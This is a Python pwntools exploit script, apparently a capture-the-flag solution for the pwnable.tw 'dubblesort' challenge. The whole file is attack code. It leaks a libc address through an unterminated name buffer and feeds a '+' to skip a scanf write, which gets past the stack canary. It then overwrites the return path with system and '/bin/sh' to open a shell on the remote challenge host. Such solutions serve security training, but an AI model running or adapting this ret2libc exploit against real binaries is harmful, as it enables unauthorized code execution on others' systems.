#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./dubblesorte', checksec=False)
libc = ELF('./libc_32.so.6',checksec=False)
ld = ELF('./ld-2.23.so',checksec=False)

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*main+85
                b*main+111
                b*main+333
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('chall.pwnable.tw', 10101)
else:
        p = process(exe.path)

# GDB()

if args.REMOTE:
        sa(b'name :',b'a'*0x1d)
        p.recvuntil(b'a'*0x1d)
        libc_leak = u32(b'a' + p.recv(3))
        libc.address = libc_leak - 0x61 - 0x1b0000
        info('libc leak: ' + hex(libc_leak))
        info('libc base: ' + hex(libc.address))
else:
        sa(b'name :',b'a'*0x1c)
        p.recvuntil(b'a'*0x1c)
        libc_leak = u32(p.recv(4))
        libc.address = libc_leak - 0x1ae244
        info('libc leak: ' + hex(libc_leak))
        info('libc base: ' + hex(libc.address))


system = libc.sym['system']
binsh = next(libc.search(b'/bin/sh\0'))
info("system: " + hex(system))
info("binsh: " + hex(binsh))

sla(b'sort :',b'35')

for i in range(24):
        sla(b'number : ',b'1')

sla(b'number : ',b'+')

for i in range(8):
        sla(b'number : ',str(system))

sla(b'number : ',str(binsh))
sla(b'number : ',str(binsh))
